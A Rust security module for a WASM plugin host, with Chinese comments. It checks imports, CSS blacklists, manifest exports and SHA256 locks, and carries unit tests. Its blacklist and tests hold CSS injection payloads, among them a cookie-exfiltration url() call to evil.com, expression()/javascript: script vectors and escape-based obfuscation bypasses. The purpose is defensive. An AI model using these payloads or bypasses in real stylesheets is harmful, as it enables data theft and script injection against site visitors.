//! Phase 9.2 — 插件安全检测套件。
//!
//! 与运行时沙箱（fuel / memory / timeout / output cap，见 [`crate::PluginManager`]
//! Phase 8.1 实现）互补的**静态 + 字节级**检测，在装载前 / 输出聚合时跑，
//! 命中即拒绝或跳过，不影响正常路径。
//!
//! 本模块提供 4 类检测：
//!
//! 1. [`scan_imports`] —— wasm import 白名单 = ∅。当前宿主未暴露任何 host fn，
//!    任何 `(import ...)` 都视为不安全（防止未来误开 IO 被滥用）
//! 2. [`sanitize_theme_css`] —— theme CSS 黑名单字符串扫描，挡常见 CSS 注入
//!    数据外渗（`url(http://...)` / `@import` / `expression()` / `behavior:` / `javascript:`）
//! 3. [`verify_manifest_consistency`] —— manifest 声明的 capability 必须对应
//!    实际导出的 fn；缺失即拒，多余仅作 warn
//! 4. [`verify_sha256`] —— site.json `plugins_lock` 记录预期 hash，加载前比对，
//!    挡"插件文件被偷换"
//!
//! Ed25519 签名校验：fork 模式下用户极少生成 PEM 公钥，本 phase 不实现；
//! 留待后续若有真实需求再加。SHA256 lock 已经能挡绝大多数文件篡改场景。

use sdk::PluginManifest;
use wasmi::Module;

/// 通用必备 export（所有 capability 都应有的）。
const COMMON_EXPORTS: &[&str] = &["get_manifest", "alloc", "memory"];

/// 按 capability 期望的必备 export 集合。
///
/// 返回 `&'static [&'static str]` 而不是 `Vec`，因为 capability 表很小且固定。
fn required_exports(capability: &str) -> &'static [&'static str] {
  match capability {
    sdk::capabilities::THEME => &["get_theme_css"],
    sdk::capabilities::I18N => &["translate"],
    sdk::capabilities::AUTH_PROVIDER => {
      &["get_config", "exchange_code", "fetch_profile", "get_display_info"]
    }
    sdk::capabilities::MODERATION_PROVIDER => {
      &["moderation_build_prompt", "moderation_parse_verdict"]
    }
    // Phase 9.3：content-transformer 插件必须导出 transform_markdown。
    sdk::capabilities::CONTENT_TRANSFORMER => &["transform_markdown"],
    // notification / layout / mdx-component 暂未定 ABI，留作后续 phase 扩此表。
    _ => &[],
  }
}

/// 扫描 wasm 模块的所有 import 段。
///
/// 当前宿主（[`crate::PluginManager`]）的 `Linker` 没有 `define` 任何 host fn，
/// 所以任何 import 必然在实例化时失败 —— 提前在这里拒绝，能给出明确错误而非
/// 隐晦的 "function not found in linker"。同时也防"未来误暴露 host fn 被旧
/// 恶意插件捡漏"。
///
/// 返回 `Ok(())` 表示无 import；`Err(msg)` 列出所有 import 便于排查。
pub fn scan_imports(module: &Module) -> Result<(), String> {
  let imports: Vec<String> =
    module.imports().map(|imp| format!("{}::{}", imp.module(), imp.name())).collect();
  if imports.is_empty() {
    Ok(())
  } else {
    Err(format!("plugin declares {} disallowed import(s): {}", imports.len(), imports.join(", ")))
  }
}

/// theme CSS **黑名单** pattern（注意：是 blacklist，不是 allowlist）。
/// 命中任何一个 = 整段 CSS 拒绝（不进 `<style>`）。
///
/// S8（风险 R5）：匹配前先过 [`normalize_css_for_scan`] 规范化（解码 CSS
/// 转义 + 去注释 + 去空白 + 小写），封堆 `\75rl(`、`url( http://`、
/// `url(/**/http://` 等混淆绕过。仍不是完整 CSS parser，但规范化 +
/// 整段拒绝（fail-closed）下，误拒优于漏放。彻底方案是属性/函数白名单
/// 解析器（待 lightningcss 等依赖成本可接受时升级）。
///
/// 攻击场景：
/// - `url(http://evil.com/?cookie=...)` —— CSS 注入做数据外渗（受害者浏览器
///   主动发请求，攻击者拿到 referrer / cookie / IP）
/// - `@import url(...)` —— 同上
/// - `expression(...)` / `behavior:` / `-moz-binding:` —— 老引擎脚本执行向量
/// - `javascript:` / `vbscript:` —— 在 `url()` / `content` 等场景下能执行
///
/// pattern 不含空白（规范化已去除全部空白）；带引号变体因此也合并进
/// `url('http://` 等无空白形式。
const THEME_CSS_BLACKLIST: &[&str] = &[
  "url(http://",
  "url(https://",
  "url(//",
  "url('http://",
  "url('https://",
  "url('//",
  "url(\"http://",
  "url(\"https://",
  "url(\"//",
  "@import",
  "expression(",
  "behavior:",
  "-moz-binding:",
  "javascript:",
  "vbscript:",
];

/// S8：扫描前规范化 CSS，对抗混淆：
/// 1. 去除 `/* ... */` 注释（防 token 分割）
/// 2. 解码 CSS 转义 `\HH...`（1-6 位 hex + 可选空白）与 `\<char>` 字面转义
///    （防 `\75 rl(` → `url(` 绕过）
/// 3. 去除全部空白（防 `url( http://` 绕过；合法 CSS 语义不依赖被扫描
///    副本的空白，原串不变）
/// 4. 小写化
///
/// 只用于安全扫描；命中与否都不修改原 CSS。
fn normalize_css_for_scan(css: &str) -> String {
  let mut out = String::with_capacity(css.len());
  let mut chars = css.chars().peekable();
  while let Some(c) = chars.next() {
    // 注释：/* ... */ 整段丢弃
    if c == '/' && chars.peek() == Some(&'*') {
      chars.next(); // 吃掉 '*'
      let mut prev = '\0';
      for cc in chars.by_ref() {
        if prev == '*' && cc == '/' {
          break;
        }
        prev = cc;
      }
      continue;
    }
    // CSS 转义：\HH...（1-6 hex）+ 可选一个空白；或 \<char> 字面
    if c == '\\' {
      let mut hex = String::new();
      while hex.len() < 6 {
        match chars.peek() {
          Some(h) if h.is_ascii_hexdigit() => {
            hex.push(*h);
            chars.next();
          }
          _ => break,
        }
      }
      if hex.is_empty() {
        // \<char> 字面转义：保留下一个字符本身
        if let Some(next) = chars.next() {
          if !next.is_whitespace() {
            out.extend(next.to_lowercase());
          }
        }
      } else {
        // hex 转义后的一个空白属于转义序列，吃掉
        if chars.peek().map(|w| w.is_whitespace()).unwrap_or(false) {
          chars.next();
        }
        if let Some(decoded) = u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
          out.extend(decoded.to_lowercase());
        }
      }
      continue;
    }
    if c.is_whitespace() {
      continue;
    }
    out.extend(c.to_lowercase());
  }
  out
}

/// 检查 theme CSS 是否包含危险 pattern（规范化后匹配，对抗大小写 /
/// 转义 / 空白 / 注释混淆）。
///
/// 返回命中的 pattern 列表；空 vec 表示通过。调用者命中时应跳过该插件 CSS
/// 整段（不部分清洗），同时记 warn 日志。
///
/// 允许的合法场景：
/// - `url(/assets/...)` —— 站内相对路径
/// - `url(data:image/png;base64,...)` —— 内联 base64 图片（CSP 配合限制 MIME）
pub fn sanitize_theme_css(css: &str) -> Vec<&'static str> {
  let normalized = normalize_css_for_scan(css);
  THEME_CSS_BLACKLIST.iter().filter(|pat| normalized.contains(*pat)).copied().collect()
}

/// 校验 manifest 声明的 capability 与 wasm 实际 exports 是否对齐。
///
/// 返回值：
/// - `Ok(extras)` —— capability 必备 export 齐全；`extras` 是 export 中**多余**
///   的项（不属于通用 + 任何已声明 capability 的必备集），调用者可记 warn
/// - `Err(msg)` —— 缺必备 export，列出哪些缺失 + 拒绝加载
///
/// "多余 export" 的常见正当来源：插件内部辅助 fn 标了 `#[no_mangle]`、
/// `dealloc`（与 `alloc` 配对但不强制）、宏生成的 `__plugin_inner_*` 等。
/// 本检测只拒绝**缺失**，不拒绝多余。
pub fn verify_manifest_consistency(
  manifest: &PluginManifest,
  module: &Module,
) -> Result<Vec<String>, String> {
  let exports: Vec<String> = module.exports().map(|e| e.name().to_string()).collect();

  let mut expected: Vec<&'static str> = COMMON_EXPORTS.to_vec();
  for cap in &manifest.capabilities {
    expected.extend(required_exports(cap));
  }

  let missing: Vec<&'static str> =
    expected.iter().filter(|e| !exports.iter().any(|name| name == *e)).copied().collect();

  if !missing.is_empty() {
    return Err(format!(
      "plugin '{}' declares capabilities {:?} but missing exports: {:?}",
      manifest.id, manifest.capabilities, missing
    ));
  }

  let extras: Vec<String> = exports
    .into_iter()
    .filter(|name| !expected.iter().any(|e| *e == name))
    .filter(|name| name != "dealloc")
    .filter(|name| !name.starts_with("__"))
    .collect();
  Ok(extras)
}

/// 校验 wasm 字节的 SHA256 是否匹配预期 hex 摘要。
///
/// `expected_hex` 大小写不敏感；实际值小写化后与之比对。
///
/// 用于 site.json `plugins_lock` 字段：fork 用户运行 `lock_plugins` CLI 生成
/// 每个插件的 sha256 写入 site.json，之后宿主每次加载都比对，防止文件被外部
/// 偷换（例如供应链攻击中替换 release 包内的 .wasm）。
#[cfg(feature = "server")]
pub fn verify_sha256(bytes: &[u8], expected_hex: &str) -> Result<(), String> {
  use sha2::{Digest, Sha256};
  let mut hasher = Sha256::new();
  hasher.update(bytes);
  let actual = format!("{:x}", hasher.finalize());
  let expected_lower = expected_hex.to_lowercase();
  if actual == expected_lower {
    Ok(())
  } else {
    Err(format!("sha256 mismatch (expected {}, got {})", expected_lower, actual))
  }
}

/// 综合检测报告。`admin_upload_plugin` / lock CLI 可一次性产出给 UI 展示。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SecurityReport {
  pub imports_ok: bool,
  pub imports_detail: Option<String>,
  pub manifest_ok: bool,
  pub manifest_detail: Option<String>,
  pub manifest_extras: Vec<String>,
  /// `None` 表示未提供 expected hex（即 site.json 无 lock）；
  /// `Some(true)` 通过；`Some(false)` 不匹配（带详情）。
  pub sha256_status: Option<Result<(), String>>,
}

impl SecurityReport {
  pub fn is_hard_failure(&self) -> bool {
    !self.imports_ok || !self.manifest_ok || matches!(self.sha256_status, Some(Err(_)))
  }
}

#[cfg(all(test, feature = "server"))]
mod tests {
  use super::*;
  use sdk::{capabilities, PluginManifest};
  use std::path::Path;
  use wasmi::{Config, Engine};

  fn load_module(path: &Path) -> Option<Module> {
    if !path.exists() {
      return None;
    }
    let bytes = std::fs::read(path).ok()?;
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    Module::new(&engine, &bytes).ok()
  }

  // ─── scan_imports ─────────────────────────────────────────

  #[test]
  fn scan_imports_passes_for_real_plugin() {
    let Some(module) = load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let result = scan_imports(&module);
    assert!(result.is_ok(), "i18n_fluent should have no imports: {:?}", result);
  }

  #[test]
  fn scan_imports_rejects_module_with_import() {
    // 构造一段包含 import 的最小 wasm（声明 import "env" "log" func）
    let wat = r#"
      (module
        (import "env" "log" (func $log (param i32)))
        (func (export "noop"))
      )
    "#;
    let wasm = wat::parse_str(wat).expect("wat → wasm");
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    let module = Module::new(&engine, &wasm).expect("module");
    let result = scan_imports(&module);
    assert!(result.is_err());
    let msg = result.unwrap_err();
    assert!(msg.contains("env::log"), "msg should list import: {}", msg);
  }

  // ─── sanitize_theme_css ──────────────────────────────────

  #[test]
  fn css_sanitize_passes_normal_css() {
    let css = ":root { --color-primary: #7c3aed; }\nbody { background: var(--color-bg); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_passes_data_url_image() {
    let css = ".logo { background: url(data:image/png;base64,iVBORw0KG); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_passes_relative_path() {
    let css = ".banner { background: url(/assets/banner.png); }";
    assert!(sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_external_url() {
    let css = "body { background: url(http://evil.com/?cookie=stolen); }";
    let hits = sanitize_theme_css(css);
    assert!(hits.iter().any(|p| p.contains("url(http://")));
  }

  #[test]
  fn css_sanitize_rejects_external_https_url() {
    let css = "body { background: url(https://evil.com/track); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_protocol_relative_url() {
    let css = "body { background: url(//evil.com/track); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_import() {
    let css = "@import 'https://evil.com/x.css';";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_expression() {
    let css = "body { width: expression(alert('xss')); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_behavior() {
    let css = ".x { behavior: url(xss.htc); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_rejects_javascript_url() {
    let css = "a { content: url(javascript:alert(1)); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  #[test]
  fn css_sanitize_case_insensitive() {
    let css = "body { background: URL(HTTP://EVIL.COM/x); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  // ─── S8：混淆绕过场景 ──────────────────────────────

  /// `url(` 后带空白是合法 CSS，旧实现匹配不到。
  #[test]
  fn css_sanitize_rejects_url_with_whitespace() {
    let css = "body { background: url(  http://evil.com/x ); }";
    assert!(!sanitize_theme_css(css).is_empty(), "空白混淆应被拦截");
  }

  /// CSS hex 转义：`\75 rl(` 解码后是 `url(`。
  #[test]
  fn css_sanitize_rejects_hex_escaped_url() {
    let css = r"body { background: \75 rl(http://evil.com/x); }";
    assert!(!sanitize_theme_css(css).is_empty(), "hex 转义混淆应被拦截");
  }

  /// 字面转义：`\u\r\l(` 解码后是 `url(`。
  #[test]
  fn css_sanitize_rejects_literal_escaped_url() {
    let css = r"body { background: \u\r\l(http://evil.com/x); }";
    assert!(!sanitize_theme_css(css).is_empty(), "字面转义混淆应被拦截");
  }

  /// hex 转义拼 @import：`@\69mport`。
  #[test]
  fn css_sanitize_rejects_escaped_import() {
    let css = r"@\69mport 'https://evil.com/x.css';";
    assert!(!sanitize_theme_css(css).is_empty(), "转义 @import 应被拦截");
  }

  /// 注释 + 空白分割：`url(/**/ http://`。
  #[test]
  fn css_sanitize_rejects_comment_split_url() {
    let css = "body { background: url(/* x */ http://evil.com/x); }";
    assert!(!sanitize_theme_css(css).is_empty(), "注释分割应被拦截");
  }

  /// 带引号 + 空白：`url( 'http://`。
  #[test]
  fn css_sanitize_rejects_quoted_url_with_whitespace() {
    let css = "body { background: url( 'http://evil.com/x' ); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  /// 老 Firefox XBL 向量。
  #[test]
  fn css_sanitize_rejects_moz_binding() {
    let css = ".x { -moz-binding: url(/xbl.xml#x); }";
    assert!(!sanitize_theme_css(css).is_empty());
  }

  /// 规范化不应误伤合法 CSS（含注释 / 多空白 / data URL）。
  #[test]
  fn css_sanitize_normalization_keeps_legit_css_clean() {
    let css = "/* theme: ocean */\n:root {\n  --color-primary: #0ea5e9;\n}\n.logo { background: url( data:image/png;base64,iVBORw0KG ); }\n.banner { background: url( /assets/banner.png ); }";
    assert!(sanitize_theme_css(css).is_empty(), "合法 CSS 不应误拒");
  }

  // ─── verify_manifest_consistency ─────────────────────────

  #[test]
  fn manifest_consistency_passes_for_real_i18n_plugin() {
    let Some(module) = load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let manifest = PluginManifest::new("i18n-fluent", "i18n Fluent", "0.1.0")
      .with_capability(capabilities::I18N);
    let result = verify_manifest_consistency(&manifest, &module);
    assert!(result.is_ok(), "should pass for real plugin: {:?}", result);
  }

  /// Phase 9.3：声明 content-transformer 能力但缺 `transform_markdown` → 拒绝。
  #[test]
  fn manifest_consistency_rejects_content_transformer_missing_export() {
    // 构造一段只有 alloc / memory / get_manifest 的 wasm，不导出 transform_markdown。
    let wat = r#"
      (module
        (memory (export "memory") 1)
        (func (export "get_manifest") (result i64) (i64.const 0))
        (func (export "alloc") (param i32) (result i32) (i32.const 0))
      )
    "#;
    let wasm = wat::parse_str(wat).expect("wat → wasm");
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    let module = Module::new(&engine, &wasm).expect("module");
    let bad = PluginManifest::new("fake-ct", "Fake Content Transformer", "0.1.0")
      .with_capability(capabilities::CONTENT_TRANSFORMER);
    let result = verify_manifest_consistency(&bad, &module);
    assert!(result.is_err());
    let msg = result.unwrap_err();
    assert!(msg.contains("transform_markdown"), "msg should call out missing fn: {}", msg);
  }

  /// 声明 content-transformer 且确实导出 transform_markdown → 通过。
  #[test]
  fn manifest_consistency_passes_for_synthetic_content_transformer() {
    let wat = r#"
      (module
        (memory (export "memory") 1)
        (func (export "get_manifest") (result i64) (i64.const 0))
        (func (export "alloc") (param i32) (result i32) (i32.const 0))
        (func (export "transform_markdown") (param i32 i32) (result i64) (i64.const 0))
      )
    "#;
    let wasm = wat::parse_str(wat).expect("wat → wasm");
    let mut config = Config::default();
    config.consume_fuel(true);
    let engine = Engine::new(&config);
    let module = Module::new(&engine, &wasm).expect("module");
    let manifest = PluginManifest::new("synth-ct", "Synth Content Transformer", "0.1.0")
      .with_capability(capabilities::CONTENT_TRANSFORMER);
    let result = verify_manifest_consistency(&manifest, &module);
    assert!(result.is_ok(), "expected ok, got {:?}", result);
  }

  #[test]
  fn manifest_consistency_rejects_missing_export() {
    // 用 i18n 模块假装它声明 auth-provider capability —— 必然缺 exchange_code
    let Some(module) = load_module(Path::new("../../assets/plugins/i18n_fluent_plugin.wasm"))
    else {
      return;
    };
    let bad_manifest = PluginManifest::new("fake-auth", "Fake", "0.1.0")
      .with_capability(capabilities::AUTH_PROVIDER);
    let result = verify_manifest_consistency(&bad_manifest, &module);
    assert!(result.is_err(), "should reject: i18n module has no exchange_code");
    let msg = result.unwrap_err();
    assert!(msg.contains("exchange_code"));
  }

  // ─── verify_sha256 ───────────────────────────────────────

  #[test]
  fn sha256_passes_on_match() {
    let bytes = b"hello world";
    // sha256("hello world") = b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9
    let result =
      verify_sha256(bytes, "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9");
    assert!(result.is_ok());
  }

  #[test]
  fn sha256_case_insensitive_match() {
    let bytes = b"hello world";
    let result =
      verify_sha256(bytes, "B94D27B9934D3E08A52E52D7DA7DABFAC484EFE37A5380EE9088F7ACE2EFCDE9");
    assert!(result.is_ok());
  }

  #[test]
  fn sha256_rejects_on_mismatch() {
    let bytes = b"hello world";
    let result = verify_sha256(bytes, "deadbeef");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("mismatch"));
  }

  // ─── SecurityReport ──────────────────────────────────────

  #[test]
  fn report_is_hard_failure_when_imports_bad() {
    let r = SecurityReport {
      imports_ok: false,
      imports_detail: Some("env::log".into()),
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec![],
      sha256_status: None,
    };
    assert!(r.is_hard_failure());
  }

  #[test]
  fn report_is_hard_failure_when_sha256_mismatch() {
    let r = SecurityReport {
      imports_ok: true,
      imports_detail: None,
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec![],
      sha256_status: Some(Err("mismatch".into())),
    };
    assert!(r.is_hard_failure());
  }

  #[test]
  fn report_clean_run_is_not_failure() {
    let r = SecurityReport {
      imports_ok: true,
      imports_detail: None,
      manifest_ok: true,
      manifest_detail: None,
      manifest_extras: vec!["__plugin_inner_translate".into()],
      sha256_status: Some(Ok(())),
    };
    assert!(!r.is_hard_failure());
  }
}
